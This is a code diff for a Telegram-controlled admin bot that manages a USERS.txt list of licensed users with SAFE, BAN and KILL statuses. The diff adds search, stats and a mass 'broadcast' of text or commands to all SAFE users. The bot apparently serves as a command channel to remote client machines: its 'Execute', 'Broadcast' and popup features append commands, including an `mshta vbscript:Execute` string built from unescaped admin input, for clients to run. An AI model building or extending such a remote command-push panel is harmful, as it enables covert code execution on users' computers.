@@ -21,12 +21,11 @@ BOT_TOKEN = os.environ.get("BOT_TOKEN")
 if not BOT_TOKEN:
     raise ValueError("No BOT_TOKEN environment variable set")
 
-# Optional: Add your Telegram Chat ID in Railway to receive daily automated backups
 ADMIN_ID = os.environ.get("ADMIN_ID") 
 
 KEYS_FILE = "KEYS.txt"
 USERS_FILE = "USERS.txt"
-USERS_BACKUP_FILE = "USERS_BACKUP.txt" # Added for the Undo Ban feature
+USERS_BACKUP_FILE = "USERS_BACKUP.txt"
 
 # State Constants
 (
@@ -41,8 +40,10 @@ USERS_BACKUP_FILE = "USERS_BACKUP.txt" # Added for the Undo Ban feature
     WAITING_FOR_RENAME_NEW,
     WAITING_FOR_KILL,
     WAITING_FOR_POP_USERS,
-    WAITING_FOR_POP_TEXT
-) = range(12)
+    WAITING_FOR_POP_TEXT,
+    WAITING_FOR_SEARCH,
+    WAITING_FOR_BROADCAST
+) = range(14)
 
 app = Flask(__name__)
 logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
@@ -50,13 +51,80 @@ logger = logging.getLogger(__name__)
 
 # ---------- CORE HELPER FUNCTIONS ----------
 
-def ban_all_users_sync():
-    """Backs up the current users, then sets every user to BAN status."""
+def clear_global_msg_sync():
+    """Resets SAFE users back to plain 'SAFE', removing extra broadcast text."""
     if not os.path.exists(USERS_FILE): return 0
-    
-    # 1. Create a backup first so we can undo it later
+    updated_count = 0
+    new_lines = []
+    with open(USERS_FILE, "r") as f:
+        lines = f.readlines()
+    for line in lines:
+        if " -> " in line:
+            parts = line.split(" -> ")
+            username = parts[0].strip()
+            status = parts[1].strip().upper()
+            # Only affect users who are currently SAFE (even if they have extra text)
+            if "SAFE" in status:
+                new_lines.append(f"{username} -> SAFE\n")
+                updated_count += 1
+            else:
+                new_lines.append(line)
+        else:
+            new_lines.append(line)
+    with open(USERS_FILE, "w") as f:
+        f.writelines(new_lines)
+    return updated_count
+
+def broadcast_update_sync(extra_text: str):
+    """Sends a message to ALL users who are currently in SAFE status."""
+    if not os.path.exists(USERS_FILE): return 0
+    updated_count = 0
+    new_lines = []
+    with open(USERS_FILE, "r") as f:
+        lines = f.readlines()
+    for line in lines:
+        if " -> " in line:
+            parts = line.split(" -> ")
+            username = parts[0].strip()
+            status = parts[1].strip().upper()
+            # Only target SAFE users. Skip BAN or KILL.
+            if "SAFE" in status:
+                new_lines.append(f"{username} -> SAFE {extra_text}\n")
+                updated_count += 1
+            else:
+                new_lines.append(line)
+        else:
+            new_lines.append(line)
+    with open(USERS_FILE, "w") as f:
+        f.writelines(new_lines)
+    return updated_count
+
+def get_stats_sync():
+    if not os.path.exists(USERS_FILE): return "File not found."
+    safe, banned, kill, total = 0, 0, 0, 0
+    with open(USERS_FILE, "r") as f:
+        for line in f:
+            if " -> " in line:
+                total += 1
+                status = line.split(" -> ")[1].strip().upper()
+                if "SAFE" in status: safe += 1
+                elif "BAN" in status: banned += 1
+                elif "KILL" in status: kill += 1
+    return f"📊 **System Stats**\n━━━━━━━━━━━━━━\n👥 Total Users: `{total}`\n✅ SAFE: `{safe}`\n🚫 BANNED: `{banned}`\n☠️ KILL: `{kill}`"
+
+def search_user_sync(query: str):
+    if not os.path.exists(USERS_FILE): return "File not found."
+    query = query.strip().lower()
+    results = []
+    with open(USERS_FILE, "r") as f:
+        for line in f:
+            if query in line.lower(): results.append(line.strip())
+    if not results: return f"🔍 No users found matching `{query}`"
+    return "🔍 **Search Results:**\n" + "\n".join([f"`{r}`" for r in results])
+
+def ban_all_users_sync():
+    if not os.path.exists(USERS_FILE): return 0
     shutil.copyfile(USERS_FILE, USERS_BACKUP_FILE)
-    
     updated_count = 0
     new_lines = []
     with open(USERS_FILE, "r") as f:
@@ -66,31 +134,24 @@ def ban_all_users_sync():
             username_part = line.split(" -> ")[0].strip()
             new_lines.append(f"{username_part} -> BAN\n")
             updated_count += 1
-        else:
-            new_lines.append(line)
-    with open(USERS_FILE, "w") as f:
-        f.writelines(new_lines)
+        else: new_lines.append(line)
+    with open(USERS_FILE, "w") as f: f.writelines(new_lines)
     return updated_count
 
 def undo_ban_all_sync():
-    """Restores the USERS_FILE from the backup created before the mass ban."""
-    if not os.path.exists(USERS_BACKUP_FILE):
-        return False
-    # Copy the backup over the current file
+    if not os.path.exists(USERS_BACKUP_FILE): return False
     shutil.copyfile(USERS_BACKUP_FILE, USERS_FILE)
     return True
 
 def rename_user_sync(old_name: str, new_name: str):
     if not os.path.exists(USERS_FILE): return False
-    updated = False
-    new_lines = []
+    updated, new_lines = False, []
     with open(USERS_FILE, "r") as f:
         lines = f.readlines()
     for line in lines:
         if " -> " in line:
             parts = line.split(" -> ")
-            current_name = parts[0].strip()
-            status = parts[1].strip()
+            current_name, status = parts[0].strip(), parts[1].strip()
             if current_name == old_name.strip():
                 new_lines.append(f"{new_name.strip()} -> {status}\n")
                 updated = True
@@ -145,20 +206,12 @@ def delete_sync_users(target_input: str):
 
 # ---------- AUTOMATED BACKUP TASK ----------
 async def send_daily_backup(context: ContextTypes.DEFAULT_TYPE):
-    """Sends the database files automatically to the ADMIN_ID daily."""
-    if not ADMIN_ID:
-        logger.warning("ADMIN_ID not set. Skipping automated daily backup.")
-        return
+    if not ADMIN_ID: return
     try:
-        if os.path.exists(USERS_FILE):
-            with open(USERS_FILE, 'rb') as f:
-                await context.bot.send_document(chat_id=ADMIN_ID, document=f, caption="📅 Daily USERS Backup")
-        if os.path.exists(KEYS_FILE):
-            with open(KEYS_FILE, 'rb') as f:
-                await context.bot.send_document(chat_id=ADMIN_ID, document=f, caption="📅 Daily KEYS Backup")
-        logger.info("Daily backups sent successfully.")
-    except Exception as e:
-        logger.error(f"Failed to send daily backup: {e}")
+        for f_name, cap in [(USERS_FILE, "📅 Daily USERS Backup"), (KEYS_FILE, "📅 Daily KEYS Backup")]:
+            if os.path.exists(f_name):
+                with open(f_name, 'rb') as f: await context.bot.send_document(chat_id=ADMIN_ID, document=f, caption=cap)
+    except Exception as e: logger.error(f"Backup error: {e}")
 
 # ---------- UI COMPONENTS ----------
 
@@ -168,9 +221,10 @@ def main_menu_keyboard():
         [InlineKeyboardButton("🚫 Ban", callback_data="m_ban"), InlineKeyboardButton("☠️ KILL", callback_data="m_kill")],
         [InlineKeyboardButton("🗑️ Delete", callback_data="m_del"), InlineKeyboardButton("✏️ Rename", callback_data="m_rename")],
         [InlineKeyboardButton("⚡ Execute", callback_data="m_exec"), InlineKeyboardButton("💬 Popup Msg", callback_data="m_popup")],
-        [InlineKeyboardButton("📋 List", callback_data="m_list")],
+        [InlineKeyboardButton("🔍 Search", callback_data="m_search"), InlineKeyboardButton("📊 Stats", callback_data="m_stats")],
+        [InlineKeyboardButton("📢 Broadcast (SAFE)", callback_data="m_broad"), InlineKeyboardButton("🧹 Clear (SAFE)", callback_data="m_clear_broad")],
+        [InlineKeyboardButton("📋 Full List", callback_data="m_list"), InlineKeyboardButton("📥 Get Backups", callback_data="m_backup")],
         [InlineKeyboardButton("💀 BAN ALL USERS", callback_data="m_ban_all"), InlineKeyboardButton("↩️ Undo Ban All", callback_data="m_undo_ban")],
-        [InlineKeyboardButton("📥 Get Backups", callback_data="m_backup"), InlineKeyboardButton("ℹ️ Help", callback_data="m_help")],
         [InlineKeyboardButton("✖️ Close Session", callback_data="m_cancel")]
     ]
     return InlineKeyboardMarkup(keyboard)
@@ -183,18 +237,14 @@ def cancel_keyboard():
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     text = "✨ **System Hub Online**\n━━━━━━━━━━━━━━\nSelect administrative action:"
     reply_markup = main_menu_keyboard()
-    if update.callback_query:
-        await update.callback_query.edit_message_text(text, reply_markup=reply_markup, parse_mode="Markdown")
-    else:
-        await update.message.reply_text(text, reply_markup=reply_markup, parse_mode="Markdown")
+    if update.callback_query: await update.callback_query.edit_message_text(text, reply_markup=reply_markup, parse_mode="Markdown")
+    else: await update.message.reply_text(text, reply_markup=reply_markup, parse_mode="Markdown")
     return MENU_HUB
 
 async def timeout_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    msg = "⏰ **Session Timeout**\nYour session has expired due to 2 minutes of inactivity."
-    if update.callback_query:
-        await update.callback_query.edit_message_text(msg, parse_mode="Markdown")
-    elif update.message:
-        await update.message.reply_text(msg, parse_mode="Markdown")
+    msg = "⏰ **Session Timeout**"
+    if update.callback_query: await update.callback_query.edit_message_text(msg)
+    elif update.message: await update.message.reply_text(msg)
     return ConversationHandler.END
 
 async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
@@ -202,129 +252,114 @@ async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> i
     await query.answer()
     c = query.data
 
-    if c == "m_stop":
-        await query.edit_message_text("❌ **Action Cancelled.**")
-        return await start(update, context)
-    if c == "m_reg": 
-        await query.edit_message_text("📝 **Registration**\nSend: `KEY USERNAME`", parse_mode="Markdown", reply_markup=cancel_keyboard()); return WAITING_FOR_REG
-    if c == "m_grant": 
-        await query.edit_message_text("✅ **Grant SAFE**\nSend Username(s):", parse_mode="Markdown", reply_markup=cancel_keyboard()); return WAITING_FOR_GRANT
-    if c == "m_ban": 
-        await query.edit_message_text("🚫 **Set BAN**\nSend Username(s):", parse_mode="Markdown", reply_markup=cancel_keyboard()); return WAITING_FOR_BAN
-    if c == "m_kill": 
-        await query.edit_message_text("☠️ **Set KILL**\nSend Username(s):", parse_mode="Markdown", reply_markup=cancel_keyboard()); return WAITING_FOR_KILL
-    if c == "m_del": 
-        await query.edit_message_text("🗑️ **Sync Delete**\nSend Username(s):", parse_mode="Markdown", reply_markup=cancel_keyboard()); return WAITING_FOR_DELETE
-    if c == "m_rename":
-        await query.edit_message_text("✏️ **Rename User**\nStep 1: Send the **current** username:", parse_mode="Markdown", reply_markup=cancel_keyboard()); return WAITING_FOR_RENAME_OLD
-    if c == "m_exec": 
-        await query.edit_message_text("⚡ **Execute**\nStep 1: Send Username(s):", parse_mode="Markdown", reply_markup=cancel_keyboard()); return WAITING_FOR_EXEC_USERS
-    if c == "m_popup":
-        await query.edit_message_text("💬 **Popup Message**\nStep 1: Send Username(s):", parse_mode="Markdown", reply_markup=cancel_keyboard()); return WAITING_FOR_POP_USERS
+    if c == "m_stop": return await start(update, context)
+    if c == "m_reg": await query.edit_message_text("📝 **Registration**\nSend: `KEY USERNAME`", parse_mode="Markdown", reply_markup=cancel_keyboard()); return WAITING_FOR_REG
+    if c == "m_grant": await query.edit_message_text("✅ **Grant SAFE**\nSend Username(s):", parse_mode="Markdown", reply_markup=cancel_keyboard()); return WAITING_FOR_GRANT
+    if c == "m_ban": await query.edit_message_text("🚫 **Set BAN**\nSend Username(s):", parse_mode="Markdown", reply_markup=cancel_keyboard()); return WAITING_FOR_BAN
+    if c == "m_kill": await query.edit_message_text("☠️ **Set KILL**\nSend Username(s):", parse_mode="Markdown", reply_markup=cancel_keyboard()); return WAITING_FOR_KILL
+    if c == "m_del": await query.edit_message_text("🗑️ **Sync Delete**\nSend Username(s):", parse_mode="Markdown", reply_markup=cancel_keyboard()); return WAITING_FOR_DELETE
+    if c == "m_rename": await query.edit_message_text("✏️ **Rename**\nSend **current** name:", parse_mode="Markdown", reply_markup=cancel_keyboard()); return WAITING_FOR_RENAME_OLD
+    if c == "m_exec": await query.edit_message_text("⚡ **Execute**\nStep 1: Send Username(s):", parse_mode="Markdown", reply_markup=cancel_keyboard()); return WAITING_FOR_EXEC_USERS
+    if c == "m_popup": await query.edit_message_text("💬 **Popup Msg**\nStep 1: Send Username(s):", parse_mode="Markdown", reply_markup=cancel_keyboard()); return WAITING_FOR_POP_USERS
+    
+    if c == "m_stats":
+        stats_text = get_stats_sync()
+        await query.edit_message_text(stats_text, reply_markup=main_menu_keyboard(), parse_mode="Markdown"); return MENU_HUB
+    if c == "m_search":
+        await query.edit_message_text("🔍 **Search User**\nEnter username or keyword:", parse_mode="Markdown", reply_markup=cancel_keyboard()); return WAITING_FOR_SEARCH
+    if c == "m_broad":
+        await query.edit_message_text("📢 **Broadcast (To SAFE Only)**\nEnter text/command to send to all safe users:", parse_mode="Markdown", reply_markup=cancel_keyboard()); return WAITING_FOR_BROADCAST
+    
+    if c == "m_clear_broad":
+        count = clear_global_msg_sync()
+        await query.edit_message_text(f"🧹 **Global Messages Removed**\n{count} SAFE users reset to default status.", reply_markup=main_menu_keyboard(), parse_mode="Markdown")
+        return MENU_HUB
 
     if c == "m_ban_all":
         count = ban_all_users_sync()
-        await query.edit_message_text(f"💀 **Mass Ban Applied**\n{count} users were moved to BAN status.\n\n*If this was a mistake, use 'Undo Ban All'.*", reply_markup=main_menu_keyboard(), parse_mode="Markdown")
-        return MENU_HUB
-    
+        await query.edit_message_text(f"💀 **Mass Ban Applied** ({count} users)", reply_markup=main_menu_keyboard(), parse_mode="Markdown"); return MENU_HUB
     if c == "m_undo_ban":
-        success = undo_ban_all_sync()
-        if success:
-            msg = "✅ **Undo Successful**\nUsers restored to their states prior to the mass ban."
-        else:
-            msg = "❌ **No backup found to restore.**"
-        await query.edit_message_text(msg, reply_markup=main_menu_keyboard(), parse_mode="Markdown")
-        return MENU_HUB
-
+        msg = "✅ **Undo Successful**" if undo_ban_all_sync() else "❌ **No backup found.**"
+        await query.edit_message_text(msg, reply_markup=main_menu_keyboard(), parse_mode="Markdown"); return MENU_HUB
+    
     if c == "m_backup":
-        await query.edit_message_text("📤 **Sending backups directly to this chat...**", parse_mode="Markdown")
         chat_id = update.effective_chat.id
         try:
-            if os.path.exists(USERS_FILE):
-                with open(USERS_FILE, 'rb') as f:
-                    await context.bot.send_document(chat_id=chat_id, document=f)
-            if os.path.exists(KEYS_FILE):
-                with open(KEYS_FILE, 'rb') as f:
-                    await context.bot.send_document(chat_id=chat_id, document=f)
-            # FIX: We keep the user in MENU_HUB so the buttons still work
+            for f_name in [USERS_FILE, KEYS_FILE]:
+                if os.path.exists(f_name):
+                    with open(f_name, 'rb') as f: await context.bot.send_document(chat_id=chat_id, document=f)
             await query.edit_message_text("✅ **Backups sent successfully!**", reply_markup=main_menu_keyboard(), parse_mode="Markdown")
             return MENU_HUB
-        except Exception as e:
-            await context.bot.send_message(chat_id=chat_id, text=f"❌ Error: {e}", reply_markup=main_menu_keyboard(), parse_mode="Markdown")
-            return MENU_HUB
+        except: return MENU_HUB
 
     if c == "m_list":
         try:
             with open(USERS_FILE, "r") as f: content = f.read().strip()
-            msg = f"📋 **Database**\n```\n{content if content else 'Empty'}\n```"
+            msg = f"📋 **Full Database**\n```\n{content if content else 'Empty'}\n```"
         except: msg = "❌ File not found."
         await query.edit_message_text(msg, reply_markup=main_menu_keyboard(), parse_mode="Markdown"); return MENU_HUB
-    
-    if c == "m_help":
-        help_text = "🚀 **Help**\nKill: Set user status to KILL\nRename: Change a user's name\nDelete: Delete a User\nRegister: Add user\nGet Backups: Downloads Database\nUndo Ban All: Reverses an accidental mass ban"
-        await query.edit_message_text(help_text, reply_markup=main_menu_keyboard(), parse_mode="Markdown"); return MENU_HUB
     
     if c == "m_cancel": 
         await query.edit_message_text("💤 Session Closed."); return ConversationHandler.END
 
 async def handle_registration(update: Update, context: ContextTypes.DEFAULT_TYPE):
     parts = update.message.text.split()
-    if len(parts) < 2: 
-        await update.message.reply_text("⚠️ Use: `KEY USERNAME`", reply_markup=cancel_keyboard()); return WAITING_FOR_REG
+    if len(parts) < 2: await update.message.reply_text("⚠️ Use: `KEY USERNAME`", reply_markup=cancel_keyboard()); return WAITING_FOR_REG
     write_to_files(parts[0], " ".join(parts[1:]), "SAFE")
-    await update.message.reply_text(f"✅ Registered `{parts[1]}`")
-    return await start(update, context)
+    await update.message.reply_text(f"✅ Registered `{parts[1]}`"); return await start(update, context)
+
+async def handle_search(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    res = search_user_sync(update.message.text)
+    await update.message.reply_text(res, parse_mode="Markdown"); return await start(update, context)
+
+async def handle_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    count = broadcast_update_sync(update.message.text)
+    await update.message.reply_text(f"📢 Broadcast sent to {count} SAFE users."); return await start(update, context)
 
 async def handle_rename_old(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data["rename_old"] = update.message.text.strip()
-    await update.message.reply_text(f"✏️ Target: `{update.message.text}`\nStep 2: Send the **NEW** username:", parse_mode="Markdown", reply_markup=cancel_keyboard())
-    return WAITING_FOR_RENAME_NEW
+    await update.message.reply_text("✏️ Send **NEW** username:", reply_markup=cancel_keyboard()); return WAITING_FOR_RENAME_NEW
 
 async def handle_rename_new(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    old_name, new_name = context.user_data.get("rename_old"), update.message.text.strip()
-    if rename_user_sync(old_name, new_name): await update.message.reply_text(f"✅ Renamed `{old_name}` to `{new_name}`")
-    else: await update.message.reply_text(f"❌ User `{old_name}` not found.")
-    return await start(update, context)
+    old, new = context.user_data.get("rename_old"), update.message.text.strip()
+    msg = f"✅ Renamed `{old}` to `{new}`" if rename_user_sync(old, new) else f"❌ `{old}` not found."
+    await update.message.reply_text(msg); return await start(update, context)
 
 async def handle_grant(update: Update, context: ContextTypes.DEFAULT_TYPE):
     count, _ = batch_update_users(update.message.text, "SAFE")
-    await update.message.reply_text(f"✅ Updated {count} users to SAFE"); return await start(update, context)
+    await update.message.reply_text(f"✅ Updated {count} to SAFE"); return await start(update, context)
 
 async def handle_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
     count, _ = batch_update_users(update.message.text, "BAN")
-    await update.message.reply_text(f"🚫 {count} users BANNED"); return await start(update, context)
+    await update.message.reply_text(f"🚫 {count} BANNED"); return await start(update, context)
 
 async def handle_kill(update: Update, context: ContextTypes.DEFAULT_TYPE):
     count, _ = batch_update_users(update.message.text, "KILL")
-    await update.message.reply_text(f"☠️ {count} users set to KILL status."); return await start(update, context)
+    await update.message.reply_text(f"☠️ {count} set to KILL."); return await start(update, context)
 
 async def handle_delete(update: Update, context: ContextTypes.DEFAULT_TYPE):
     count = delete_sync_users(update.message.text)
-    await update.message.reply_text(f"🗑️ Deleted {count} users."); return await start(update, context)
+    await update.message.reply_text(f"🗑️ Deleted {count}."); return await start(update, context)
 
 async def handle_exec_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data["exec_targets"] = update.message.text
-    await update.message.reply_text("📝 **Step 2:** Send text to append:", reply_markup=cancel_keyboard())
-    return WAITING_FOR_EXEC_TEXT
+    await update.message.reply_text("📝 Send text to append:", reply_markup=cancel_keyboard()); return WAITING_FOR_EXEC_TEXT
 
 async def handle_exec_final(update: Update, context: ContextTypes.DEFAULT_TYPE):
     count, _ = batch_update_users(context.user_data.get("exec_targets", ""), "SAFE", update.message.text)
-    await update.message.reply_text(f"⚡ Modified {count} users."); return await start(update, context)
+    await update.message.reply_text(f"⚡ Modified {count}."); return await start(update, context)
 
 async def handle_pop_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data["pop_targets"] = update.message.text
-    await update.message.reply_text("💬 **Step 2:** Send Message for Popup:", reply_markup=cancel_keyboard())
-    return WAITING_FOR_POP_TEXT
+    await update.message.reply_text("💬 Send Popup Message:", reply_markup=cancel_keyboard()); return WAITING_FOR_POP_TEXT
 
 async def handle_pop_final(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    msg_text = update.message.text.strip()
-    vbs_formatted = f'mshta vbscript:Execute("msgbox ""{msg_text}"",64,""System Message"":close")'
-    count, _ = batch_update_users(context.user_data.get("pop_targets", ""), "SAFE", vbs_formatted)
-    await update.message.reply_text(f"💬 Sent popup to {count} users."); return await start(update, context)
+    vbs = f'mshta vbscript:Execute("msgbox ""{update.message.text.strip()}"",64,""System Message"":close")'
+    count, _ = batch_update_users(context.user_data.get("pop_targets", ""), "SAFE", vbs)
+    await update.message.reply_text(f"💬 Sent to {count}."); return await start(update, context)
 
 # ---------- APP SETUP ----------
 application = Application.builder().token(BOT_TOKEN).build()
-
 conv_handler = ConversationHandler(
     entry_points=[CommandHandler("start", start), CommandHandler("begin", start)],
     states={
@@ -340,6 +375,8 @@ conv_handler = ConversationHandler(
         WAITING_FOR_EXEC_TEXT: [CallbackQueryHandler(menu_callback), MessageHandler(filters.TEXT & ~filters.COMMAND, handle_exec_final)],
         WAITING_FOR_POP_USERS: [CallbackQueryHandler(menu_callback), MessageHandler(filters.TEXT & ~filters.COMMAND, handle_pop_users)],
         WAITING_FOR_POP_TEXT: [CallbackQueryHandler(menu_callback), MessageHandler(filters.TEXT & ~filters.COMMAND, handle_pop_final)],
+        WAITING_FOR_SEARCH: [CallbackQueryHandler(menu_callback), MessageHandler(filters.TEXT & ~filters.COMMAND, handle_search)],
+        WAITING_FOR_BROADCAST: [CallbackQueryHandler(menu_callback), MessageHandler(filters.TEXT & ~filters.COMMAND, handle_broadcast)],
         ConversationHandler.TIMEOUT: [MessageHandler(filters.ALL, timeout_handler), CallbackQueryHandler(timeout_handler)]
     },
     fallbacks=[CallbackQueryHandler(menu_callback, pattern="^m_stop$")],
@@ -349,21 +386,17 @@ application.add_handler(conv_handler)
 
 loop = asyncio.new_event_loop()
 asyncio.set_event_loop(loop)
-
 async def init_app():
     await application.initialize()
     if application.job_queue:
-        t = datetime.time(hour=0, minute=0, tzinfo=datetime.timezone.utc)
-        application.job_queue.run_daily(send_daily_backup, time=t)
+        application.job_queue.run_daily(send_daily_backup, time=datetime.time(hour=0, minute=0, tzinfo=datetime.timezone.utc))
     domain = os.environ.get("RAILWAY_PUBLIC_DOMAIN")
     if domain: await application.bot.set_webhook(url=f"https://{domain}/webhook")
-
 loop.create_task(init_app())
 
 def run_loop():
     asyncio.set_event_loop(loop)
     loop.run_forever()
-
 threading.Thread(target=run_loop, daemon=True).start()
 
 @app.route('/webhook', methods=['POST'])
